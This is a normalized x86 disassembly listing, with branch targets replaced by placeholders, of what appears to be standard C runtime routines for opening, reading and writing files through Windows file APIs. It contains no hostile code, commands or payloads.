mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_2010d4a
pop ecx
pop ebp
retn
sub_201275c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_2010d4a
pop ecx
pop ebp
retn
sub_201278b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_2022136
add esp 0x14
test eax eax
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_20222c0
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_2012a54
push 0x10
push r--data
call sub_200db54
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2012b83
mov eax edi
call sub_200db99
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_201a99e
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_2019192
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_2009d98
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_20126ee
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_2010d79
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_201275c
pop ecx
pop ecx
sub_2012b8c
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_2012c1c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_20223f1
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_2022410
jmp r-xdata
sub_2012c1c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_200b53e
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_2012b8c
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_2012c7e
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_2012cae
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_2012cdf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_200fb13
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_20204a6
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_20134c9
pop ecx
push eax
call sub_20133cc
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_20134c9
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_20134c9
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_20134c9
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_20134c9
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_2012e0a
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_200fb26
and [ eax ] 0x0
call sub_200fb13
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_200fb26
mov [ eax ] ebx
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_200fb26
mov [ eax ] ebx
call sub_200fb13
mov [ eax ] 0x9
jmp r-xdata
call sub_200fb26
mov [ eax ] ebx
call sub_200fb13
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_201a99e
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_2020308
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_200fb13
mov [ eax ] 0xc
call sub_200fb26
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_200fb39
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_200fb13
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_2020308
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_2020308
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_2020308
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_20133cc
push 0x10
push r--data
call sub_200db54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_200fb26
and [ eax ] 0x0
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] esi
call sub_200fb13
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_200db99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_2022591
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_200fb26
mov [ eax ] esi
call sub_200fb13
mov [ eax ] 0x16
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2012e0a
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20134bf
mov eax [ ebp - 0x1c ]
sub_20134c9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_20134fb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_2013580
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_2013e10
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_200fb13
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
sub_2013580
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_202295f
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_20135fa
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_2022d90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_200fb26
mov [ eax ] esi
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_200b53e
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_200fb26
xor esi esi
mov [ eax ] esi
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_20204ef
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_2020308
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_200d753
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
